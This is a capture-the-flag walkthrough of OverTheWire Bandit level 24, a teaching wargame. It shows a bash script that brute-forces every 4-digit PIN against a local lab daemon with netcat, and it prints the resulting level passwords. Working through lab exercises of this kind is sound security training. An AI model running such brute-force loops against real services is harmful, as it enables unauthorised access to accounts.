# OverTheWire Bandit Level 24 → Level 25

## Objective

A daemon is listening on port `30002` and will give the password for the next level if supplied with:

- Current Bandit24 password
- Correct 4-digit PIN

The goal was to brute force all possible PIN combinations.

---

## Step 1: Login to Bandit24

```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
```

Entered the password from the previous level and logged in successfully.

---

## Step 2: Create Working Directory

Moved into a temporary directory:

```bash
cd /tmp
mkdir avi
cd avi
```

---

## Step 3: Create Brute Force Script

Created a script:

```bash
nano script.sh
```

Added:

```bash
#!/bin/bash

for i in {0000..9999}
do
        echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i >> possiblities.txt
done

cat possiblities.txt | nc localhost 30002 > result.txt
```

### Script Explanation

- Loop through PINs from `0000` to `9999`
- Append:

```
current_password PIN
```

into `possiblities.txt`

Example:

```
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0000
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0001
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0002
```

Then send everything to:

```bash
nc localhost 30002
```

Output gets stored inside:

```bash
result.txt
```

---

## Step 4: Make Script Executable

```bash
chmod +x script.sh
```

Run it:

```bash
./script.sh
```

---

## Step 5: Check Output

List files:

```bash
ls
```

Observed:

```
possiblities.txt
result.txt
script.sh
```

Read results:

```bash
cat result.txt
```

Output initially showed many failures:

```
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
```

Eventually:

```
Correct!
The password of user bandit25 is
iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

---

## Password Obtained

```text
iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

